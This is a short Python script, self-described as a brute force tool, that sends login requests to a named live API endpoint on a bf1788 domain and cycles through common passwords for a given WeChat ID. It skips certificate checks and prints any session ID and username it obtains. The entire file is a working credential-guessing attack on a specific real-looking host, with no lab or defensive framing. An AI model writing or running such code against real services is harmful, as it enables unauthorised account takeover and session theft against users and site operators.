#!/usr/bin/env python3
# Simple brute force tool for bf1788
import requests, sys, json

TARGET = "https://apib63.bf1788.com/boxApi.php"
BASE = {"vendorId": "test", "signature": "test", "site": "bfc", "lang": "tw"}

def login(wechatId, password):
    params = {"cmd": "1000", "wechatId": wechatId, "password": password, "sid": "", **BASE}
    try:
        resp = requests.post(TARGET, data=params, timeout=10, verify=False)
        data = resp.json()
        if str(data.get("status")) == "0":
            msg = data.get("msg", {})
            if isinstance(msg, dict) and msg.get("sid"):
                return msg.get("sid"), msg.get("username")
    except:
        pass
    return None, None

if __name__ == "__main__":
    wid = sys.argv[1] if len(sys.argv) > 1 else "testwechat001"
    passwords = ["123456", "password", "admin", "bf1788", "test", "abc123"]
    for pw in passwords:
        sid, user = login(wid, pw)
        if sid:
            print(f"[+] FOUND PASSWORD: {pw}, sid={sid}, username={user}")
        else:
            print(f"[-] Failed: {pw}")
